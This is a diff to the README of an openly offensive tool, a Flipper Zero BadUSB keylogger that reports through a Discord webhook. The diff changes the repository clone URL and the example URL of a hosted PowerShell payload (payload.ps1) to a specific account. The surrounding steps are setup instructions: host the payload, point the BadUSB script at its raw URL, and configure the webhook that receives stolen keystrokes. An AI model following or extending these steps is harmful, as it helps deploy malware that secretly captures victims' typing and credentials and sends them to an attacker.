@@ -41,7 +41,7 @@ This repository contains:
 
 1. **Clone the Repository**:  
    ```bash  
-   git clone https://github.com/138i5/Flipper-Zero-BadUSB-Discord-Keylogger
+   git clone https://github.com/L15DEV/Flipper-Zero-BadUSB-Discord-Keylogger
    cd Flipper-Zero-BadUSB-Discord-Keylogger 
    ```  
 
@@ -49,7 +49,7 @@ This repository contains:
    - Replace `YOUR_RAW_PS1_URL` in the BadUSB script with the URL where your `payload.ps1` is hosted.  
    - Example:  
      ```plaintext  
-     http://raw.githubusercontent.com/YOUR_USERNAME/flipper-badusb-keylogger/main/payload.ps1  
+     http://raw.githubusercontent.com/L15DEV/flipper-badusb-keylogger/main/payload.ps1  
      ```  
 
 3. **Update the Discord Webhook**:  
